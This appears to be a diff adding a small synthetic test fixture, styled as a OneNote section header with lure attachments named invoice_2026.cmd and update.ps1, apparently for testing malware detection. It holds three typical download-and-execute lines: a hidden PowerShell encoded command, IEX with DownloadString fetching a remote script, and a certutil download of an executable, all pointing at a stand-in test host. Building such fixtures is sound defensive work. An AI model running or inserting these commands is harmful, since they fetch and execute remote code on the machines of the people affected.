@@ -1,0 +1,10 @@
+äR\{Ø§M®±SxÐ)ÓOneNote section header (synthetic / inert)
+
+Attachment: invoice_2026.cmd
+Attachment: update.ps1
+
+powershell -nop -w hidden -EncodedCommand AAAA
+IEX (New-Object Net.WebClient).DownloadString('http://staging.example-malware-test.com/p.ps1')
+certutil -urlcache -split -f http://staging.example-malware-test.com/a.exe a.exe
+
+This file is a harmless test fixture for PAYLOADLAB. It contains no shellcode.
